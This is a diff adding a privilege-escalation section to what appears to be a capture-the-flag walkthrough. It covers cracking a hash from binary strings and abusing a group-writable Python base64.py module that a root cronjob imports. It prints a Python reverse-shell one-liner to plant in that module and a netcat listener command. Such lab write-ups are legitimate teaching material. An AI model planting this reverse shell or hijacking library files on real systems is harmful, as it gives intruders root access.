@@ -152,6 +152,94 @@ Lets see what we can work with.
 ### Now that we have more credentials we can try them against FTP and SSH.
 * No success on FTP but surely enough we got a successful login on SSH.
 ![](img/33.png)
+![](img/34.png)
+
+## Privilege Escalation
+
+### In the home direcotry there is an interesting executable file.
+![](img/35.png)
+### When run it asks for credentials. I used the ones we already found but it didn't like them.
+![](img/36.png)
+### Me might need to download this file for further analysis. Lets use python http server.
+![](img/37.png)
+![](img/38.png)
+
+### At first I tried to decompile it and analyse it with ghidra but it was difficult to understand the decompiled code. I assume the binary being statically linked and stripped has to do with that.
+
+
+### After no success with ghidra I decided to check the strings.
+![](img/39.png)
+
+### Now I slowly scrolled thorugh the file and looked for something that stands out.
+
+![](img/40.png)
+
+### Here I found the words user, pass and a few strings that don't look like the rest. Lets check if any of these is some kind of hash.
+
+![](img/41.png)
+
+### Looks like crack station has something for us. Now lets figure out for which user this password is.
+
+![](img/42.png)
+
+### We can see we have only one user whom we still don't know the password.
+
+![](img/43.png)
+![](img/44.png)
+
+### Now I decided to check id command, any sudo rights our user has, and if there are any cronjobs.
+
+![](img/45.png)
+
+### No luck on sudo rights, but we found an interesting group our user is in and a very suspicious cronjob. Lets check the script we see.
+
+![](img/46.png)
+
+### It is owned by root so we can't modify it. It seems to encode images every minute.
+
+### Lets go back and take a look at the group we were in. We can look for any files the group has permission over with the following command
+```bash
+find / -group <group>
+```
+
+![](img/47.png)
+
+### I have also redirected **stderr** to not see permission denied messages using ***2>/dev/null***.
+
+### We can see the group has full access to **python3.8** folder and **base64.py** file.
+
+![](img/48.png)
+![](img/49.png)
+
+### Recall that the script we found earlier uses base64 module to encode the images. We can modify the base64 file and add code we want to run because of the **valleyAdmin** group we are in. Any code we add to the base64 module will be executed with root privileges because that is how it is set in the cronjob.
+
+### So let's set up a reverse shell. I will be using this one:
+
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
+```
+
+### Lets slap our reverse shell in the **base64.py** file.
+
+![](img/50.png)
+
+### And set up a netcat listener.
+```bash
+nc - nvlp <Port>
+```
+
+### And we got a shell.
+
+![](img/51.png)
+
+
+
+
+
+
+
+
+
 
 
 
